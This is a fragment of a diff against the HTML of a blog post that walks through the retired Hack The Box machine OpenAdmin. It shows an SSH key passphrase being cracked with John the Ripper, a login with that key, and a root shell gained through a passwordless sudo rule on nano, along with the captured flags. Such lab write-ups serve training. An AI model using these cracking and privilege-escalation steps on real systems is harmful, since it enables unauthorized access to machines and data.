+Use the "--format=ssh-opencl" option to force loading these as that type instead
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
@@ -498,16 +438,15 @@ Cost 2 (iteration count) is 1 for all loaded hashes
 Will run 4 OpenMP threads
 Note: This format may emit false positives, so it will keep trying even after
 finding a possible candidate.
-Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+Press 'q' or Ctrl-C to abort, almost any other key for status
 bloodninjas      (id_rsa)
 Warning: Only 1 candidate left, minimum 4 needed for performance.
 1g 0:00:00:04 DONE (2020-01-07 15:25) 0.2087g/s 2994Kp/s 2994Kc/s 2994KC/s *7¡Vamos!
 Session completed
 </code></pre></div>
-
 <p>We connect as <code>joanna</code> using SSH.</p>
 <div class="highlight"><pre><span></span><code>ssh joanna@10.10.10.171 -i /tmp/id_rsa
-Enter passphrase for key &#39;/tmp/id_rsa&#39;:
+Enter passphrase for key '/tmp/id_rsa':
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
 &lt;SNIP&gt;
 joanna@openadmin:~$ ls
@@ -515,7 +454,6 @@ user.txt
 joanna@openadmin:~$ cat user.txt
 c9b2cf07d40807e62af62660f0c81b5f
 </code></pre></div>
-
 <h1>Getting root</h1>
 <p>We start enumerating the box and found that we have the <code>sudo</code> right without
 password on <code>/bin/nano /op/priv/</code>.</p>
@@ -526,7 +464,6 @@ Matching Defaults entries for joanna on openadmin:
 User joanna may run the following commands on openadmin:
     (ALL) NOPASSWD: /bin/nano /opt/priv
 </code></pre></div>
-
 <p>A quick look at <a href="https://gtfobins.github.io/gtfobins/nano/">GTFObins</a> show us
 that we can execute commands in nano with &lt;^R^X&gt;. We just run <code>id</code> and <code>cat
 /root/root.txt</code>.</p>
@@ -535,68 +472,46 @@ that we can execute commands in nano with &lt;^R^X&gt;. We just run <code>id</co
 uid=0(root) gid=0(root) groups=0(root)
 2f907ed450b361b2c2bf4e8795d5b561
 </code></pre></div>
-
 <h1>Wrapping up</h1>
 <p>This was a really easy box with almost no rabbit hole. I will recommend this box
 for the beginner until it retires (of course this article will be publish after
 its retirement).</p>
-  </div>
-  <div class="tag-cloud">
-    <p>
-      <a href="../../tag/security.html">security</a>
-      <a href="../../tag/boot2root.html">boot2root</a>
-      <a href="../../tag/htb.html">HTB</a>
-      <a href="../../tag/openadmin.html">openAdmin</a>
-      <a href="../../tag/sudo.html">sudo</a>
-      <a href="../../tag/nano.html">nano</a>
-    </p>
-  </div>
-
-
-  <div class="neighbors">
-    <a class="btn float-left" href="../../2020/04/hackpack-ctf-2020.html" title="Hackpack CTF 2020">
-      <i class="fa fa-angle-left"></i> Previous Post
-    </a>
-    <a class="btn float-right" href="../../2020/05/htb-obscurity.html" title="HTB: Obscurity">
-      Next Post <i class="fa fa-angle-right"></i>
-    </a>
-  </div>
-
-
-
-</article>
-
-    <footer>
+</div>
+<div class="tag-cloud">
 <p>
-  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
+<a href="../../tag/security.html">security</a>
+<a href="../../tag/boot2root.html">boot2root</a>
+<a href="../../tag/htb.html">HTB</a>
+<a href="../../tag/openadmin.html">openAdmin</a>
+<a href="../../tag/sudo.html">sudo</a>
+<a href="../../tag/nano.html">nano</a>
+</p>
+</div>
+<div class="neighbors">
+<a class="btn float-left" href="../../2020/04/hackpack-ctf-2020.html" title="Hackpack CTF 2020">
+<i class="fa fa-angle-left"></i> Previous Post
+    </a>
+<a class="btn float-right" href="../../2020/05/htb-obscurity.html" title="HTB: Obscurity">
+      Next Post <i class="fa fa-angle-right"></i>
+</a>
+</div>
+</article>
+<footer>
+<p>
+  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
 </p>
 <p>
 Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
   <span class="footer-separator">|</span>
   Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
-  <script id="dark-theme-script"
-          src="../../theme/dark-theme/dark-theme.min.js"
-          data-enable-auto-detect-theme="True"
-          data-default-theme="light"
-          type="text/javascript">
-  </script>
+  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
+</script>
 </p><p>
-  <a rel="license"
-     href="http://creativecommons.org/licenses/by/4.0/"
-     target="_blank">
-    <img alt="Creative Commons License"
-         title="Creative Commons License"
-         style="border-width:0"
-           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
-         width="80"
-         height="15"/>
-  </a>
-</p>    </footer>
-  </main>
-
-
-
-
+<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
+<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
+</img></a>
+</p> </footer>
+</main>
 <script type="application/ld+json">
 {
   "@context" : "http://schema.org",
@@ -607,6 +522,5 @@ Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a 
   "description": ""
 }
 </script>
-
 </body>
 </html>
